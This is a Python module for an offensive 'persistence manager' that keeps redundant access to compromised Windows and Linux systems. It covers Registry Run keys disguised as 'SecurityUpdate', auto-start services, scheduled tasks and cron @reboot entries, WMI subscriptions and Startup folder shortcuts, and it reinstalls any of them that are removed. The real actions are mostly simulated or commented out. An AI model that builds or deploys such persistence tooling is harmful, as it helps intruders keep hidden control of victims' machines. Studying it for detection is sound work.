"""
Persistence Manager - Advanced Persistence Mechanisms
Coordinates multiple persistence techniques for maintaining access
"""

import asyncio
import logging
from typing import Dict, List, Optional, Any
from datetime import datetime
from pathlib import Path
import json

logger = logging.getLogger(__name__)


class PersistenceMechanism:
    """Base class for persistence mechanisms"""
    
    def __init__(self, name: str, os_type: str):
        self.name = name
        self.os_type = os_type  # 'windows', 'linux', 'macos'
        self.installed = False
        self.install_time = None
        
    async def install(self) -> bool:
        """Install persistence mechanism"""
        raise NotImplementedError
        
    async def verify(self) -> bool:
        """Verify persistence is active"""
        raise NotImplementedError
        
    async def remove(self) -> bool:
        """Remove persistence mechanism"""
        raise NotImplementedError
        
    def get_info(self) -> Dict[str, Any]:
        """Get mechanism information"""
        return {
            'name': self.name,
            'os_type': self.os_type,
            'installed': self.installed,
            'install_time': self.install_time.isoformat() if self.install_time else None
        }


class PersistenceManager:
    """
    Manages multiple persistence mechanisms
    Ensures redundant access to compromised systems
    """
    
    def __init__(self, os_type: str = 'windows'):
        """
        Initialize persistence manager
        
        Args:
            os_type: Operating system type (windows, linux, macos)
        """
        self.os_type = os_type
        self.mechanisms: List[PersistenceMechanism] = []
        self.active_mechanisms: List[str] = []
        
        logger.info(f"PersistenceManager initialized for {os_type}")
        
    def register_mechanism(self, mechanism: PersistenceMechanism):
        """Register a persistence mechanism"""
        if mechanism.os_type == self.os_type or mechanism.os_type == 'all':
            self.mechanisms.append(mechanism)
            logger.info(f"Registered persistence mechanism: {mechanism.name}")
        else:
            logger.warning(f"Mechanism {mechanism.name} not compatible with {self.os_type}")
            
    async def install_all(self) -> Dict[str, bool]:
        """
        Install all registered mechanisms
        
        Returns:
            Dictionary mapping mechanism name to success status
        """
        logger.info("Installing all persistence mechanisms...")
        
        results = {}
        
        for mechanism in self.mechanisms:
            try:
                success = await mechanism.install()
                results[mechanism.name] = success
                
                if success:
                    self.active_mechanisms.append(mechanism.name)
                    logger.info(f"Successfully installed: {mechanism.name}")
                else:
                    logger.warning(f"Failed to install: {mechanism.name}")
                    
            except Exception as e:
                logger.error(f"Error installing {mechanism.name}: {e}")
                results[mechanism.name] = False
                
        logger.info(f"Installed {len(self.active_mechanisms)}/{len(self.mechanisms)} mechanisms")
        return results
        
    async def verify_all(self) -> Dict[str, bool]:
        """Verify all installed mechanisms"""
        logger.info("Verifying persistence mechanisms...")
        
        results = {}
        
        for mechanism in self.mechanisms:
            if not mechanism.installed:
                continue
                
            try:
                active = await mechanism.verify()
                results[mechanism.name] = active
                
                if not active:
                    logger.warning(f"Mechanism no longer active: {mechanism.name}")
                    self.active_mechanisms.remove(mechanism.name)
                    
            except Exception as e:
                logger.error(f"Error verifying {mechanism.name}: {e}")
                results[mechanism.name] = False
                
        return results
        
    async def reinstall_failed(self):
        """Reinstall any failed mechanisms"""
        logger.info("Checking for failed mechanisms...")
        
        verification = await self.verify_all()
        
        for name, active in verification.items():
            if not active:
                mechanism = next((m for m in self.mechanisms if m.name == name), None)
                if mechanism:
                    logger.info(f"Reinstalling {name}...")
                    await mechanism.install()
                    
    async def remove_all(self) -> Dict[str, bool]:
        """Remove all persistence mechanisms"""
        logger.info("Removing all persistence mechanisms...")
        
        results = {}
        
        for mechanism in self.mechanisms:
            if mechanism.installed:
                try:
                    success = await mechanism.remove()
                    results[mechanism.name] = success
                except Exception as e:
                    logger.error(f"Error removing {mechanism.name}: {e}")
                    results[mechanism.name] = False
                    
        self.active_mechanisms.clear()
        return results
        
    def get_status(self) -> Dict[str, Any]:
        """Get status of all mechanisms"""
        return {
            'os_type': self.os_type,
            'total_mechanisms': len(self.mechanisms),
            'active_mechanisms': len(self.active_mechanisms),
            'mechanisms': [m.get_info() for m in self.mechanisms]
        }


class RegistryPersistence(PersistenceMechanism):
    """Windows Registry persistence"""
    
    def __init__(self, payload_path: str):
        super().__init__("Registry Run Key", "windows")
        self.payload_path = payload_path
        self.registry_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        self.value_name = "SecurityUpdate"
        
    async def install(self) -> bool:
        """Install registry persistence"""
        try:
            logger.info("Installing registry persistence...")
            
            # In real implementation, would use winreg or modify registry
            # This is a simulation
            logger.info(f"Would add: HKCU\\{self.registry_key}\\{self.value_name} = {self.payload_path}")
            
            # Simulated registry modification
            # import winreg
            # key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.registry_key, 0, winreg.KEY_WRITE)
            # winreg.SetValueEx(key, self.value_name, 0, winreg.REG_SZ, self.payload_path)
            # winreg.CloseKey(key)
            
            self.installed = True
            self.install_time = datetime.now()
            
            logger.info("Registry persistence installed")
            return True
            
        except Exception as e:
            logger.error(f"Registry persistence installation failed: {e}")
            return False
            
    async def verify(self) -> bool:
        """Verify registry persistence"""
        try:
            # Would check if registry key exists
            logger.info("Verifying registry persistence...")
            
            # Simulated verification
            return self.installed
            
        except Exception as e:
            logger.error(f"Registry verification failed: {e}")
            return False
            
    async def remove(self) -> bool:
        """Remove registry persistence"""
        try:
            logger.info("Removing registry persistence...")
            
            # Would delete registry key
            # import winreg
            # key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, self.registry_key, 0, winreg.KEY_WRITE)
            # winreg.DeleteValue(key, self.value_name)
            # winreg.CloseKey(key)
            
            self.installed = False
            logger.info("Registry persistence removed")
            return True
            
        except Exception as e:
            logger.error(f"Registry removal failed: {e}")
            return False


class ServicePersistence(PersistenceMechanism):
    """Windows Service persistence"""
    
    def __init__(self, service_name: str, executable_path: str):
        super().__init__("Windows Service", "windows")
        self.service_name = service_name
        self.executable_path = executable_path
        
    async def install(self) -> bool:
        """Install service persistence"""
        try:
            logger.info(f"Installing service: {self.service_name}...")
            
            # Would use sc.exe or win32service
            cmd = f'sc create {self.service_name} binPath= "{self.executable_path}" start= auto'
            logger.info(f"Would run: {cmd}")
            
            # In real implementation:
            # subprocess.run(cmd, shell=True)
            
            self.installed = True
            self.install_time = datetime.now()
            
            logger.info("Service persistence installed")
            return True
            
        except Exception as e:
            logger.error(f"Service installation failed: {e}")
            return False
            
    async def verify(self) -> bool:
        """Verify service exists and is running"""
        try:
            # Would check service status
            logger.info(f"Verifying service: {self.service_name}...")
            
            # sc query {self.service_name}
            
            return self.installed
            
        except Exception as e:
            logger.error(f"Service verification failed: {e}")
            return False
            
    async def remove(self) -> bool:
        """Remove service"""
        try:
            logger.info(f"Removing service: {self.service_name}...")
            
            # sc stop {self.service_name}
            # sc delete {self.service_name}
            
            self.installed = False
            logger.info("Service removed")
            return True
            
        except Exception as e:
            logger.error(f"Service removal failed: {e}")
            return False


class ScheduledTaskPersistence(PersistenceMechanism):
    """Scheduled Task persistence (Windows/Linux)"""
    
    def __init__(self, task_name: str, command: str, trigger: str = "ONLOGON"):
        super().__init__("Scheduled Task", "all")
        self.task_name = task_name
        self.command = command
        self.trigger = trigger
        
    async def install(self) -> bool:
        """Install scheduled task"""
        try:
            logger.info(f"Installing scheduled task: {self.task_name}...")
            
            if self.os_type == "windows":
                # Windows: schtasks
                cmd = f'schtasks /create /tn "{self.task_name}" /tr "{self.command}" /sc {self.trigger} /f'
                logger.info(f"Would run: {cmd}")
                
            else:
                # Linux: cron
                cron_entry = f"@reboot {self.command}"
                logger.info(f"Would add to crontab: {cron_entry}")
                
            self.installed = True
            self.install_time = datetime.now()
            
            logger.info("Scheduled task installed")
            return True
            
        except Exception as e:
            logger.error(f"Scheduled task installation failed: {e}")
            return False
            
    async def verify(self) -> bool:
        """Verify scheduled task exists"""
        try:
            # Would check if task exists
            return self.installed
            
        except Exception as e:
            logger.error(f"Task verification failed: {e}")
            return False
            
    async def remove(self) -> bool:
        """Remove scheduled task"""
        try:
            logger.info(f"Removing scheduled task: {self.task_name}...")
            
            if self.os_type == "windows":
                # schtasks /delete /tn {self.task_name} /f
                pass
            else:
                # Remove from crontab
                pass
                
            self.installed = False
            logger.info("Scheduled task removed")
            return True
            
        except Exception as e:
            logger.error(f"Task removal failed: {e}")
            return False


class WMIPersistence(PersistenceMechanism):
    """WMI Event Subscription persistence"""
    
    def __init__(self, payload: str):
        super().__init__("WMI Event Subscription", "windows")
        self.payload = payload
        
    async def install(self) -> bool:
        """Install WMI persistence"""
        try:
            logger.info("Installing WMI event subscription...")
            
            # Would use WMI to create event filter, consumer, and binding
            # Very stealthy technique
            
            logger.info("WMI persistence installed")
            self.installed = True
            self.install_time = datetime.now()
            return True
            
        except Exception as e:
            logger.error(f"WMI installation failed: {e}")
            return False
            
    async def verify(self) -> bool:
        """Verify WMI subscription"""
        return self.installed
        
    async def remove(self) -> bool:
        """Remove WMI subscription"""
        try:
            logger.info("Removing WMI subscription...")
            self.installed = False
            return True
        except Exception as e:
            logger.error(f"WMI removal failed: {e}")
            return False


class StartupFolderPersistence(PersistenceMechanism):
    """Startup folder persistence"""
    
    def __init__(self, payload_path: str):
        super().__init__("Startup Folder", "windows")
        self.payload_path = payload_path
        
    async def install(self) -> bool:
        """Install startup folder shortcut"""
        try:
            logger.info("Installing startup folder persistence...")
            
            # Would create shortcut in:
            # %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
            
            self.installed = True
            self.install_time = datetime.now()
            
            logger.info("Startup folder persistence installed")
            return True
            
        except Exception as e:
            logger.error(f"Startup folder installation failed: {e}")
            return False
            
    async def verify(self) -> bool:
        """Verify shortcut exists"""
        return self.installed
        
    async def remove(self) -> bool:
        """Remove shortcut"""
        try:
            self.installed = False
            return True
        except Exception as e:
            return False
